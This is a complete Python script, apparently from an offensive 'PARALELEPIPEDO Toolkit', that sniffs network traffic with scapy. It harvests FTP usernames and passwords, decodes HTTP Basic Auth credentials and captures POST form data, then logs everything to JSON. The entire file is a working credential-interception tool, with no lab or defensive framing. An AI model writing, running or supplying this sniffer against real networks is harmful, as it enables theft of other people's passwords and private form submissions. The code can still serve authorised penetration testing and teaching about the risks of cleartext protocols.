
# =============================================================================
# Filename   : mitm_sniffer.py
# Description: MITM credential sniffer. Captures FTP creds, HTTP Basic Auth,
#              HTTP POST form data, auto-decompresses gzip/deflate responses.
#              Saves captures to JSON. Part of PARALELEPIPEDO Toolkit.
# Author     : PARALELEPIPEDO Toolkit
# =============================================================================

import argparse
import base64
import datetime
import gzip
import io
import json
import sys
import threading
import zlib

from colorama import Fore, Style, init
from scapy.all import IP, TCP, Raw, sniff, conf

init(autoreset=True)

_lock      = threading.Lock()
_captures  = []


def proto_print(proto: str, msg: str):
    colors = {
        "FTP":  Fore.YELLOW,
        "HTTP": Fore.CYAN,
        "AUTH": Fore.MAGENTA,
        "POST": Fore.GREEN,
    }
    color = colors.get(proto, Fore.WHITE)
    print(f"{color}[{proto}]{Style.RESET_ALL} {msg}")


def err(msg):
    print(f"{Fore.RED}[-]{Style.RESET_ALL} {msg}", file=sys.stderr)


def info(msg):
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")


# ---------------------------------------------------------------------------
# Capture saving
# ---------------------------------------------------------------------------

def save_capture(entry: dict, output_file: str | None):
    with _lock:
        _captures.append(entry)
    if output_file:
        try:
            with open(output_file, "w") as fh:
                json.dump(_captures, fh, indent=2)
        except OSError as exc:
            err(f"Failed to write output file: {exc}")


# ---------------------------------------------------------------------------
# Decompression helper
# ---------------------------------------------------------------------------

def decompress_body(data: bytes, encoding: str) -> bytes:
    try:
        enc = encoding.strip().lower()
        if enc == "gzip":
            with gzip.open(io.BytesIO(data)) as gz:
                return gz.read()
        elif enc in ("deflate", "zlib"):
            try:
                return zlib.decompress(data)
            except zlib.error:
                return zlib.decompress(data, -zlib.MAX_WBITS)
    except Exception:
        pass
    return data


# ---------------------------------------------------------------------------
# HTTP parser
# ---------------------------------------------------------------------------

def parse_http(raw: bytes, src_ip: str, dst_ip: str,
               output_file: str | None):
    """Extract Basic Auth credentials and POST form data from raw HTTP."""
    try:
        text = raw.decode("utf-8", errors="replace")
    except Exception:
        return

    lines      = text.split("\r\n")
    if not lines:
        return

    first_line = lines[0]
    headers    = {}
    body_start = -1

    for idx, line in enumerate(lines[1:], 1):
        if line == "":
            body_start = idx + 1
            break
        if ":" in line:
            key, _, val = line.partition(":")
            headers[key.strip().lower()] = val.strip()

    body = "\r\n".join(lines[body_start:]) if body_start > 0 else ""

    ts = datetime.datetime.utcnow().isoformat() + "Z"

    # -- HTTP Basic Auth
    auth = headers.get("authorization", "")
    if auth.lower().startswith("basic "):
        encoded = auth[6:].strip()
        try:
            decoded = base64.b64decode(encoded).decode("utf-8", errors="replace")
        except Exception:
            decoded = encoded
        proto_print("AUTH",
                    f"{src_ip} -> {dst_ip}  |  Basic Auth: {decoded}")
        save_capture({
            "timestamp": ts,
            "src_ip": src_ip,
            "dst_ip": dst_ip,
            "protocol": "HTTP_BASIC_AUTH",
            "data": {"raw_header": auth, "decoded": decoded},
        }, output_file)

    # -- Content-Encoding decompress
    content_enc = headers.get("content-encoding", "")
    if content_enc and body:
        body_bytes  = body.encode("utf-8", errors="replace")
        body_bytes  = decompress_body(body_bytes, content_enc)
        body        = body_bytes.decode("utf-8", errors="replace")

    # -- HTTP POST form data
    method = first_line.split(" ")[0].upper() if first_line else ""
    ctype  = headers.get("content-type", "")
    if method == "POST" and "application/x-www-form-urlencoded" in ctype:
        proto_print("POST",
                    f"{src_ip} -> {dst_ip}  |  Form data: {body.strip()}")
        save_capture({
            "timestamp": ts,
            "src_ip": src_ip,
            "dst_ip": dst_ip,
            "protocol": "HTTP_POST_FORM",
            "data": {"request_line": first_line, "body": body.strip()},
        }, output_file)


# ---------------------------------------------------------------------------
# FTP parser
# ---------------------------------------------------------------------------

_ftp_state: dict[str, dict] = {}   # src_ip -> {"user": ..., "pass": ...}


def parse_ftp(raw: bytes, src_ip: str, dst_ip: str,
              output_file: str | None):
    """Extract FTP USER and PASS commands."""
    try:
        text = raw.decode("utf-8", errors="replace").strip()
    except Exception:
        return

    upper = text.upper()
    ts    = datetime.datetime.utcnow().isoformat() + "Z"

    if upper.startswith("USER "):
        username = text[5:].strip()
        _ftp_state.setdefault(src_ip, {})["user"] = username
        proto_print("FTP", f"{src_ip} -> {dst_ip}  |  USER: {username}")

    elif upper.startswith("PASS "):
        password = text[5:].strip()
        state    = _ftp_state.get(src_ip, {})
        username = state.get("user", "<unknown>")
        proto_print("FTP",
                    f"{src_ip} -> {dst_ip}  |  PASS: {password}  "
                    f"(user: {username})")
        save_capture({
            "timestamp": ts,
            "src_ip": src_ip,
            "dst_ip": dst_ip,
            "protocol": "FTP",
            "data": {"username": username, "password": password},
        }, output_file)
        _ftp_state.pop(src_ip, None)


# ---------------------------------------------------------------------------
# Packet handler factory
# ---------------------------------------------------------------------------

def make_handler(output_file: str | None, filter_ip: str | None):
    def handler(pkt):
        if not (pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw)):
            return

        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst

        if filter_ip and src_ip != filter_ip:
            return

        raw   = bytes(pkt[Raw])
        dport = pkt[TCP].dport
        sport = pkt[TCP].sport

        # FTP: client → server (port 21)
        if dport == 21:
            parse_ftp(raw, src_ip, dst_ip, output_file)

        # HTTP: client request (port 80) or server response
        elif dport == 80 or sport == 80:
            parse_http(raw, src_ip, dst_ip, output_file)

    return handler


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_args():
    p = argparse.ArgumentParser(
        description="PARALELEPIPEDO Toolkit – MITM Credential Sniffer"
    )
    p.add_argument("--interface", "-i", default=conf.iface,
                   help="Network interface")
    p.add_argument("--output-file", "-o",
                   help="Save captures to JSON file")
    p.add_argument("--filter-ip",
                   help="Only capture traffic from this source IP")
    return p.parse_args()


def main():
    args = parse_args()

    info(f"Sniffing on {args.interface}")
    if args.filter_ip:
        info(f"Filter: src IP = {args.filter_ip}")
    if args.output_file:
        info(f"Saving captures to: {args.output_file}")
    info("Press Ctrl+C to stop.\n")

    handler = make_handler(args.output_file, args.filter_ip)

    bpf = "tcp and (port 21 or port 80)"

    try:
        sniff(
            iface=args.interface,
            filter=bpf,
            prn=handler,
            store=False,
        )
    except KeyboardInterrupt:
        pass

    print()
    info(f"Total captures: {len(_captures)}")
    if args.output_file:
        try:
            with open(args.output_file, "w") as fh:
                json.dump(_captures, fh, indent=2)
            info(f"Saved to {args.output_file}")
        except OSError as exc:
            err(f"Failed final save: {exc}")


if __name__ == "__main__":
    main()
